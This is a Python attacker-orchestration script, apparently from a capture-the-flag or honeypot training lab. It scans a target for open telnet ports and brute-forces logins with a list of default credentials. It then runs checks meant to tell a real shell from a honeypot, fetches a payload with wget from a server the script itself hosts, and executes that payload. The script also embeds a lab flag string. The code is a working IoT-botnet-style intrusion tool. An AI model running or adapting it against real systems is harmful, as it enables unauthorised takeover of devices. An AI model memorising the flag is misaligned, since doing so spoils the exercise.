#!/usr/bin/env python3
"""
anyone-home attacker orchestration.
"""
from __future__ import annotations

import http.server
import logging
import os
import glob
import socket
import socketserver
import telnetlib
import threading
import time
from datetime import date
from typing import Iterable, List, Tuple, Callable

TARGET_HOST = os.environ.get("TARGET_HOST", "172.20.0.2")
LOCAL_IP = "172.20.0.46"
RECON_PORTS = [23, 2323, 7547]
TELNET_PORT = 23
HTTP_PORT = int(os.environ.get("ATTACK_HTTP_PORT", "8080"))
PAYLOADS_WWW_ROOT = "/0ZbPWi0apUuFbpiwN2fp"
PAYLOAD_NAME = "payload.sh"
PAYLOADS_FILESYSTEM_DIR = "/var/www/payloads"
LOG_LEVEL = os.environ.get("ATTACK_LOG_LEVEL", "INFO").upper()
ATTACKING_INTERVAL = float(os.environ.get("ATTACK_PROBE_INTERVAL", "12"))
SESSION_TIMEOUT = 15

DEFAULT_CREDS = [
    ("root", "administrator"),
    ("root", "toor"),
    ("administrator", "123456"),
]

class PayloadHandler(http.server.BaseHTTPRequestHandler):
    """Simple HTTP handler that only serves the benign payload."""

    def do_GET(self) -> None:
        if self.path == PAYLOADS_WWW_ROOT:
            data = f'Files: \n' + '\n'.join(glob.glob(os.path.join(PAYLOADS_FILESYSTEM_DIR, "*")))
            self.send_response(200)
            self.send_header("Content-Type", "text/plain")
            self.send_header("Content-Length", str(len(data)))
            self.end_headers()
            self.wfile.write(data.encode())

        elif self.path.startswith(PAYLOADS_WWW_ROOT + "/") :
            offset = len(PAYLOADS_WWW_ROOT) + 1
            filepath = f"{PAYLOADS_FILESYSTEM_DIR}/{self.path[offset:]}"

            try:
                with open(filepath, "r") as f:
                    payload_data = f.read().encode()
            except OSError:
                logging.exception("Unable to read payload file at %s", filepath)
                self.send_error(500, "Payload missing.")
                return

            # Forbid file inclusion that reads directly flag of the 2nd task
            if b"BSY{cQZ3TSoUVgbiO3EeyZiI5IidU6lcknWhjFRdeJppxV8yRs9M}" in payload_data:
                self.send_error(404, "Nothing to see here.")
                return

            self.send_response(200)
            self.send_header("Content-Type", "text/plain")
            self.send_header("Content-Length", str(len(payload_data)))
            self.end_headers()
            self.wfile.write(payload_data)

        self.send_error(404, "Nothing to see here.")
        return

    def log_message(self, fmt: str, *args: object) -> None:  # pragma: no cover - suppress noisy logs
        logging.debug("http: " + fmt, *args)


class ThreadedTCPServer(socketserver.ThreadingMixIn, socketserver.TCPServer):
    allow_reuse_address = True
    daemon_threads = True


def start_payload_server() -> ThreadedTCPServer:
    server = ThreadedTCPServer(("", HTTP_PORT), PayloadHandler)
    thread = threading.Thread(target=server.serve_forever, name="http-server", daemon=True)
    thread.start()
    logging.info("Payload HTTP server listening on 0.0.0.0:%s (paths: /, /%s, /d)", HTTP_PORT, PAYLOAD_NAME)
    return server


def recon_scan(target: str, ports: Iterable[int]) -> bool:
    telnet_opened = False
    for port in ports:
        try:
            with socket.create_connection((target, port), timeout=2.0):
                logging.info("Recon: %s:%s appears OPEN.", target, port)
                if port == TELNET_PORT:
                    telnet_opened = True
        except OSError as exc:
            logging.info("Recon: %s:%s not yet available.", target, port)

    return telnet_opened


def wait_for_prompt(
    tn: telnetlib.Telnet,
    patterns: Iterable[bytes],
    timeout: float,
    send_newline_on_timeout: bool = False,
) -> bool:
    """Wait for any of the patterns to appear; optionally prod with newline."""
    end_time = time.time() + timeout
    patterns_list = list(patterns)
    while time.time() < end_time:
        idx, _match, _text = tn.expect(patterns_list, timeout=1)
        if idx != -1:
            return True
    if send_newline_on_timeout:
        tn.write(b"\r\n")
    return False


def read_until_marker(tn: telnetlib.Telnet, marker: bytes, timeout: float = 6.0) -> bytes:
    end_time = time.time() + timeout
    buffer = b""
    while time.time() < end_time:
        chunk = tn.read_very_eager()
        if chunk:
            buffer += chunk
            if marker in buffer:
                break
        else:
            time.sleep(0.1)
    return buffer


def run_command(tn: telnetlib.Telnet, command: str, check_output: Callable[[str], bool] = None, timeout: float = 6.0) -> bool:
    marker = f"marker{int(time.time()*1000)}__"
    tn.write((command + f"; echo {marker}\n").encode("ascii", "ignore"))
    raw = read_until_marker(tn, marker.encode("ascii"), timeout=timeout)
    decoded = raw.decode("utf-8", errors="ignore")
    output = decoded.replace(marker, "")

    logging.info("Output after running cmd %s: %s", command, repr(output))
    if check_output:
        return check_output(output)
    return True


def run_command_output(tn: telnetlib.Telnet, command: str, timeout: float = 6.0) -> str:
    marker = f"marker{int(time.time()*1000)}__"
    tn.write((command + f"; echo {marker}\n").encode("ascii", "ignore"))
    raw = read_until_marker(tn, marker.encode("ascii"), timeout=timeout)
    decoded = raw.decode("utf-8", errors="ignore")
    output = decoded.replace(marker, "")
    return output


def looks_real(output: str) -> bool:
    suspicious = ("not found", "can't", "invalid", "unknown", "denied")
    return not any(token in output for token in suspicious)


def attempt_telnet_attack(target: str) -> bool:
    logging.info("Attempting telnet session to %s:%s", target, TELNET_PORT)
    try:
        tn = telnetlib.Telnet(target, TELNET_PORT, timeout=SESSION_TIMEOUT)
    except OSError as exc:
        logging.debug("Telnet connection to %s:%s failed: %s", target, TELNET_PORT, exc)
        return False

    with tn:
        if not wait_for_prompt(tn, [b"login:", b"username:"], timeout=5, send_newline_on_timeout=True):
            logging.info("No login prompt seen on %s:%s", target, TELNET_PORT)
            return False

        for user, password in DEFAULT_CREDS:
            logging.info("Trying credentials %s:%s on %s:%s", user, password, target, TELNET_PORT)
            tn.write(user.encode("ascii") + b"\n")
            if not wait_for_prompt(tn, [b"password:"], timeout=3):
                tn.write(b"\n")
                continue
            tn.write(password.encode("ascii") + b"\n")
            handshake = run_command_output(tn, "echo login_ok", timeout=4)
            if "login_ok" in handshake:
                logging.info("Credential %s:%s succeeded on %s:%s", user, password, target, TELNET_PORT)
                break
        else:
            logging.info("All default credentials failed on %s:%s", target, TELNET_PORT)
            return False

        cur_month_abbr = date.today().strftime('%b').lower() # e.g.'dec'
        real_system_tests = [
            ("uname -a", looks_real),
            ("ps", lambda output: looks_real(output) and output.count("\n") > 2),
            ("date", lambda output: looks_real(output) and cur_month_abbr in output.lower()),
        ]
        for (cmd, check_func) in real_system_tests:
            if not run_command(tn, cmd, check_output=check_func, timeout=4):
                logging.info("Running or checking output of command %s failed", cmd)
                return False
            else:
                logging.info("Successful running and checking output of command %s", cmd)

        download_cmd = f"wget http://{LOCAL_IP}:{HTTP_PORT}/{PAYLOADS_WWW_ROOT}/payload.sh -O /tmp/d "
        logging.info("Staging payload on %s:%s", target, TELNET_PORT)
        run_command(tn, download_cmd, timeout=10)
        run_command(tn, "chmod +x /tmp/d 2>/dev/null || true", timeout=3)
        run_command(tn, "sh /tmp/d", timeout=6)

        logging.info("Payload deployment complete on %s:%s", target, TELNET_PORT)
        return True


def main() -> None:
    logging.basicConfig(
        level=getattr(logging, LOG_LEVEL, logging.INFO),
        format="%(asctime)s %(levelname)s %(message)s",
    )

    payload_server = start_payload_server()

    try:
        while True:
            try:
                logging.info("Initial recon sweep against %s", TARGET_HOST)
                telnet_open = recon_scan(TARGET_HOST, RECON_PORTS)

                if telnet_open:
                    logging.info("Telnet open, initiating attack")
                    attempt_telnet_attack(TARGET_HOST)
            except EOFError as e:
                logging.info(f"Error: {e}")

            logging.info(f"Sleeping for {ATTACKING_INTERVAL}s")
            time.sleep(ATTACKING_INTERVAL)
            logging.info(f"Woken up!")

    except KeyboardInterrupt:
        logging.info("Attacker interrupted, shutting down.")
    finally:
        payload_server.shutdown()
        payload_server.server_close()


if __name__ == "__main__":
    main()
